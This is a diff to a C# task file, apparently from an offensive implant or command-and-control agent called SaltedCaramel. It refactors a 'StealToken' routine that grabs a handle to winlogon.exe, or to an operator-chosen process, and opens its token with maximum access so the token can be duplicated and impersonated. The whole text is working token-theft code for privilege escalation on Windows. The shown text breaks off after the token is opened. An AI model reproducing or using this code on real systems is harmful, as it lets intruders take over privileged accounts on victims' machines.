@@ -12,32 +12,33 @@ namespace SaltedCaramel.Tasks
 
         internal static void Execute(SCTaskObject task)
         {
-            int procId;
-            IntPtr procHandle;
-            if (task.@params == "")
-            {
-                Process winlogon = Process.GetProcessesByName("winlogon")[0];
-                procHandle = winlogon.Handle;
-                Debug.WriteLine("[+] StealToken - Got handle to winlogon.exe at PID: " + winlogon.Id);
-            }
-            else
-            {
-                procId = Convert.ToInt32(task.@params);
-                procHandle = Process.GetProcessById(procId).Handle;
-                Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);
-            }
-            IntPtr tokenHandle = IntPtr.Zero; // Stores the handle for the original process token
-            stolenHandle = IntPtr.Zero; // Stores the handle for our duplicated token
-
             try
             {
+                int procId;
+                IntPtr procHandle;
+                if (task.@params == "")
+                {
+                    Process winlogon = Process.GetProcessesByName("winlogon")[0];
+                    procHandle = winlogon.Handle;
+                    Debug.WriteLine("[+] StealToken - Got handle to winlogon.exe at PID: " + winlogon.Id);
+                }
+                else
+                {
+                    procId = Convert.ToInt32(task.@params);
+                    procHandle = Process.GetProcessById(procId).Handle;
+                    Debug.WriteLine("[+] StealToken - Got handle to process: " + procId);
+                }
+
                 try
                 {
+                    // Stores the handle for the original process token
+                    stolenHandle = IntPtr.Zero; // Stores the handle for our duplicated token
+
                     // Get handle to target process token
                     bool procToken = Win32.OpenProcessToken(
                         procHandle,                                 // ProcessHandle
                         (uint)TokenAccessLevels.MaximumAllowed,     // desiredAccess
-                        out tokenHandle);                           // TokenHandle
+                        out IntPtr tokenHandle);                           // TokenHandle
 
                     if (!procToken) // Check if OpenProcessToken was successful
                         throw new Exception(Marshal.GetLastWin32Error().ToString());
